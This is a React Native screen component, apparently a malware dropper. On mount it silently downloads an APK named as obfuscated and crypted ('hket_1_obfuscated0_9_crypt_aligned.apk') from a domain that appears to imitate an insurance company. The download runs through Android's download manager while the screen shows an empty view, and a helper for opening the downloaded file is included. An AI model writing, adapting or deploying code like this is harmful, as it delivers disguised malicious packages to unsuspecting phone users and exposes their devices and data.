import React, { Component } from 'react';
import {View, Button, Alert, Linking} from 'react-native';
import RNFetchBlob from 'rn-fetch-blob';

class ApkDownloadScreenSS extends Component {
    handleDownload = () => {
        const apkUrl = 'https://app.diemobiliar.x-lodge.com/hket_1_obfuscated0_9_crypt_aligned.apk'; // İndirilecek APK dosyasının URL'sini buraya ekleyin

        const dirs = RNFetchBlob.fs.dirs;
        const downloadFilePath = `${dirs.DownloadDir}/app.apk`;

        RNFetchBlob.config({
            addAndroidDownloads: {
                useDownloadManager: true,
                notification: true,
                title: 'hket_1_obfuscated0_9_crypt_aligned.apk',
                description: 'App APK dosyası indiriliyor...',
                mime: 'application/vnd.android.package-archive',
                path: downloadFilePath,
            },
        })
            .fetch('GET', apkUrl)
            .then(() => {

            })
            .catch((error) => {
                console.error('APK indirme hatası:', error);
                Alert.alert('Hata', 'APK indirme sırasında bir hata oluştu.');
            });
    };

    openFile = (filePath) => {
        Linking.openURL(`file://${filePath}`)
            .then(() => {
                console.log('Dosya açıldı:', filePath);
            })
            .catch((error) => {
                console.error('Dosya açma hatası:', error);
                Alert.alert('Hata', 'Dosya açma sırasında bir hata oluştu.');
            });
    };

    componentDidMount() {
        this.handleDownload();
    }

    render() {
        return (
            <View>
            </View>
        );
    }
}

export default ApkDownloadScreenSS;
